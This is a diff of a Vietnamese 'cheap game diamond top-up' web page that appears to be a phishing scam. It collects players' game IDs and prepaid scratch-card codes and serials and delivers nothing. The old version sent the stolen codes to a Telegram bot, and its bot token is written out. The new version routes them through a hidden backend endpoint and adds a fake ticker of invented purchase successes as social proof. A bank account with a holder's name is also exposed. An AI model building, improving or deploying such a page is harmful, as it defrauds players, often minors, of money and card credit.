@@ -5,6 +5,34 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Kim Cương Vip - Nạp Kim Cương Giá Rẻ</title>
     <style>
+        /* Thanh thông báo chạy phía trên */
+        .marquee-container {
+            background-color: #fff3cd;
+            color: #856404;
+            padding: 8px 0;
+            overflow: hidden;
+            white-space: nowrap;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            z-index: 1000;
+            border-bottom: 1px solid #ffeeba;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        .marquee-text {
+            display: inline-block;
+            animation: marquee 25s linear infinite;
+        }
+        .marquee-text span {
+            margin-right: 50px;
+        }
+        @keyframes marquee {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+
         body {
             background-color: #e8f5e9;
             font-family: Arial, sans-serif;
@@ -14,6 +42,7 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            padding-top: 40px; /* Đẩy nội dung xuống tránh bị thanh thông báo che */
         }
         .container {
             background-color: #ffffff;
@@ -129,13 +158,23 @@
 </head>
 <body>
 
+<!-- Thanh thông báo chạy phía trên -->
+<div class="marquee-container">
+    <div class="marquee-text">
+        <span>🎉 Chúc mừng ID ***6789 vừa nạp thành công gói 50k (500💎)</span>
+        <span>🔥 ID ***4321 vừa chuyển khoản thành công 100k (1100💎)</span>
+        <span>⚡ ID ***9988 vừa nạp thẻ cào Viettel 200k (2400💎)</span>
+        <span>💎 ID ***5544 vừa nạp thành công gói 500k (5000💎)</span>
+    </div>
+</div>
+
 <div class="container">
     <h2>💎 KIM CƯƠNG VIP 💎</h2>
 
     <!-- Bước 1: Đăng nhập ID Game -->
     <div id="step-login" class="form-group">
         <label for="gameId">Nhập ID Game:</label>
-        <input type="text" id="gameId" placeholder="Nhập dãy số ID game (8-11 số)...">
+        <input type="text" id="gameId" placeholder="Nhập ID (9 hoặc 10 số)...">
         <button onclick="handleLogin()">Đăng Nhập</button>
         <p id="errorMsg" style="color: #f44336; font-size: 13px; margin-top: 5px; font-weight: bold;"></p>
     </div>
@@ -218,19 +257,17 @@
 <script>
     let currentGameId = "";
     let currentPackage = "";
-
-    const TELEGRAM_BOT_TOKEN = "8975192062:AAGANTM_Pks5TLp2RzyPosoPiCABQg1gmho";
-    const TELEGRAM_CHAT_ID = "8620455610";
+    let isSending = false; // Chống spam click liên tục
 
     function handleLogin() {
         let gameId = document.getElementById("gameId").value.trim();
         let errorMsg = document.getElementById("errorMsg");
 
-        // Kiểm tra ID phải là số và có độ dài từ 8 đến 10 chữ số (không bị khóa ban nữa)
-        let isValidId = /^\d{8,11}$/.test(gameId);
+        // ID phải chính xác 9 hoặc 10 chữ số (trên 8 và dưới 11)
+        let isValidId = /^\d{9,10}$/.test(gameId);
 
         if (!isValidId) {
-            errorMsg.innerHTML = `❌ ID không hợp lệ! (ID phải có từ 8 đến 10 số). Vui lòng nhập lại!`;
+            errorMsg.innerHTML = `❌ ID không hợp lệ! (ID phải có 9 hoặc 10 số). Vui lòng nhập lại!`;
             return;
         }
 
@@ -260,13 +297,30 @@
         }
     }
 
+    // Hàm thêm hiệu ứng chạy thông báo nạp tiền mới
+    function addNewMarqueeItem(gameId, packageInfo) {
+        let marqueeDiv = document.querySelector(".marquee-text");
+        if (!marqueeDiv) return;
+
+        let maskedId = gameId.length > 4 ? gameId.substring(0, 2) + "***" + gameId.substring(gameId.length - 2) : "***" + gameId;
+        let newSpan = document.createElement("span");
+        newSpan.innerHTML = `🔥 ID ${maskedId} vừa nạp thành công gói ${packageInfo}`;
+        marqueeDiv.prepend(newSpan);
+    }
+
     function confirmTransaction(type) {
         if (!currentPackage) {
             alert("Vui lòng chọn mốc nạp kim cương trước!");
             return;
         }
 
-        let message = `🔔 *CÓ GIAO DỊCH NẠP MỚI* 💎\n\n- *ID Game:* ${currentGameId}\n- *Gói nạp:* ${currentPackage}\n- *Hình thức:* ${type === 'card' ? 'Thẻ cào' : 'Chuyển khoản (BIDV - 8877945567 - VI THI HA)'}`;
+        // Chống spam click liên tục trong 5 giây
+        if (isSending) {
+            alert("Bạn đang thao tác quá nhanh, vui lòng từ từ!");
+            return;
+        }
+
+        let cardDetails = null;
 
         if (type === 'card') {
             let cardType = document.getElementById("cardType").value;
@@ -314,30 +368,41 @@
                 }
             }
 
-            message += `\n- *Loại thẻ:* ${cardType}\n- *Mệnh giá:* ${cardPrice}\n- *Mã thẻ:* \`${cardCode}\`\n- *Số Seri:* \`${cardSerial}\``;
+            cardDetails = { cardType, cardPrice, cardCode, cardSerial };
         }
 
-        let url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        let data = {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: "Markdown"
+        isSending = true;
+        setTimeout(() => { isSending = false; }, 5000);
+
+        // Gói dữ liệu gửi ngầm qua API ẩn bảo mật trên Vercel (giấu tuyệt đối Token)
+        let payload = {
+            gameId: currentGameId,
+            packageInfo: currentPackage,
+            paymentType: type === 'card' ? 'Thẻ cào' : 'Chuyển khoản (BIDV)',
+            cardDetails: cardDetails
         };
 
-        fetch(url, {
+        fetch('/api/send', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        }).catch(error => console.log(error));
-
-        document.getElementById("loadingModal").classList.remove("hidden");
-
-        setTimeout(() => {
-            location.reload();
-        }, 4000);
+            body: JSON.stringify(payload)
+        })
+        .then(res => res.json())
+        .then(data => {
+            addNewMarqueeItem(currentGameId, currentPackage);
+            document.getElementById("loadingModal").classList.remove("hidden");
+            setTimeout(() => {
+                location.reload();
+            }, 4000);
+        })
+        .catch(error => {
+            console.log(error);
+            isSending = false;
+            alert("Có lỗi xảy ra, vui lòng thử lại!");
+        });
     }
 </script>
 
 </body>
-                </html>
-            
+    </html>
+    
